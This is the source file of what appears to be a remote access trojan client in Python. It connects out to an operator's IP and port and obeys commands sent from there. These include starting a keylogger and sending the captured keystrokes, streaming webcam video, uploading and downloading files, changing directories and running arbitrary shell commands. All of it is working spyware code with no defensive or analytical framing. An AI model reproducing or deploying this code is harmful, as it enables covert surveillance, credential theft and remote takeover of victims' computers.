from threading import Thread
import sys
import json
import socket
import os
from ExecuteTerminal import TermialExecutor
import pynput.keyboard
from termcolor import cprint
import socket, cv2, pickle, struct
import imutils


class Color:
    def __init__(self) -> None:
        self.red = "red"
        self.green = "green"
        self.yellow = "yellow"


keylogvar = ""
keylogthread = None
streamthread = None
stream_Flag = True
keyboard_Listener = None
color = Color()


def process_Key_Press(key):
    global keylogvar
    try:
        keylogvar += str(key.char)
    except AttributeError:
        if key == key.space:
            keylogvar += " "
        else:
            # keylogvar += str(key)
            keylogvar += " "


def getVideo(clientsocket: socket.socket):
    global stream_Flag
    try:
        vid = cv2.VideoCapture(1)
        while vid.isOpened():
            ret, image = vid.read()
            image = imutils.resize(image, width=320)
            img_serialize = pickle.dumps(image)
            message = struct.pack("Q", len(img_serialize)) + img_serialize
            clientsocket.sendall(message)
            # cv2.imshow("Video from Server", image)
            if stream_Flag == False:
                print("[+] CLOSING THE SERVER ..")
                break

    except Exception as ex:
        print("[-] Get Video Error")
        print(str(ex))


def dumpLog():
    logmsg = keylogvar
    return logmsg


def keyBoardLoggerFunc():
    global keyboard_Listener
    try:
        keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
        with keyboard_Listener:
            keyboard_Listener.join(0.1)
    except Exception as ex:
        cprint("[-]Something wen Wrong", color.red)
    finally:
        cprint("[-] Terminating keyLoggerThread...", color.red)


byt = 1024 * 10

terminal = TermialExecutor()


# message Generator
def generate_Message(command):
    try:
        jsondata = json.dumps(command)
        return jsondata.encode()
    except Exception as ex:
        print(f"[-] generate message error :{str(ex)}")
        return ""


# send message
def send_Message(clientsocket: socket.socket, command):
    try:
        clientsocket.send(generate_Message(command))
    except Exception as ex:
        print(f"[-]SOMETHING WENT WRONG WHILE SENDING MESSAGE :{str(ex)}")


# received_Message
def receive_Message(clientsocket: socket.socket):
    data = ""
    while True:
        try:
            data = data + clientsocket.recv(byt).decode().rstrip()
            return json.loads(data)
        except socket.error:
            print(f"[-] CONNECTION CLOSED")
            exit()
        except Exception as ex:
            print(f"[-]SOMETHING WENT WRONG WHILE RECEIVING MESSAGE:{str(ex)}")
            exit()


# upload a file
def upload_File(file_name, clientsocket):
    try:
        fd = open(file_name, "rb")
        content = fd.read().decode()
        send_Message(clientsocket, content)
        fd.close()
    except Exception as ex:
        print(f"[-] File upload error {str(ex)}")
        send_Message(clientsocket, str(ex))


# download file
def download_file(filename, clientsocket: socket.socket):
    try:
        filecontent = receive_Message(clientsocket)
        fd = open(filename, "wb")
        fd.write(filecontent.encode())
        fd.close()
    except Exception as ex:
        print(f"[-] File upload error {str(ex)}")


def main():
    global keylogthread
    global streamthread
    global stream_Flag
    global keyboard_Listener
    if len(sys.argv) != 3:
        print("[+] Usage python ./server.py IP PORT")
        print("[+] Example python ./server.py 192.168.0.151 8000")
        return
    # EXTRACT IP_ADDRESS
    IP_ADDRESS = sys.argv[1]
    PORT = int(sys.argv[2])
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP_ADDRESS, PORT))
        while True:
            command = receive_Message(sock)
            print(f"[+] COMMAND:~>{command}")
            # quit the program
            if command == "quit":
                """before exiting check if the keylogger still exits"""
                if keyboard_Listener:
                    print("[-] Starting to terminate keylogger thread...")
                    keyboard_Listener.stop()
                    print("[+] Keylogger thread joined..")
                    keylogthread.join()
                    return exit()
                exit()

            if command == "get video":
                stream_Flag = True
                streamthread = Thread(target=getVideo, args=[sock])
                streamthread.start()
                continue
            if command == "quit videostream":
                if streamthread:
                    stream_Flag = False
                    print("[-] Exiting the stream thread ")
                    streamthread.join()
                    print("[+] streamthread joined ")

                continue
            # stop the key logger
            if command == "stop keylogger":
                if keyboard_Listener:
                    print("[-] Starting to terminate keylogger thread...")
                    keyboard_Listener.stop()
                    print("[+] Keylogger thread joined..")
                    keylogthread.join()
                    send_Message(sock, "Key Logger Stopped")
                    keyboard_Listener = None
                    keylogthread = None
                else:
                    send_Message(sock, "No key logger running")
                continue
            # start key logger
            if command == "start keylogger":
                if keyboard_Listener == None:
                    cprint("[+] Starting keylogger thread ....")
                    keylogthread = Thread(target=keyBoardLoggerFunc)
                    keylogthread.start()
                    cprint("[+] Started keylogger thread ....")
                    send_Message(sock, "Started keylogger thread ....")
                else:
                    send_Message(sock, "Key board Logger Already Running....")
                continue

            # dump log
            if command == "dump log":
                print("[+] dum log", dumpLog())
                send_Message(sock, dumpLog())
                continue

            # upload file when the server presses download
            if command[0:8] == "download":
                upload_File(command[9:], sock)
                print("[+]Done Uploading..")
                continue

            if command[0:6] == "upload":
                download_file(command[7:], sock)
                print("[+]Done Downloading..")
                continue

            # change directory
            if command[0:3] == "cd ":
                directory = command[3:].strip()
                try:
                    os.chdir(directory)
                    print("Current directory:", os.getcwd())
                    send_Message(sock, os.getcwd())
                except Exception as ex:
                    print("Directory change failed:", str(ex))
                    send_Message(sock, str(ex))
                continue
            # EXECUTE THE COMMAND
            result = terminal.execute(command)
            send_Message(sock, result)
    except socket.error as ex:
        print(f"[-]SOcket Error :{str(ex)}")
        exit()
    except Exception as ex:
        print(f"[-] Error :{str(ex)}")
        exit()


if __name__ == "__main__":
    main()
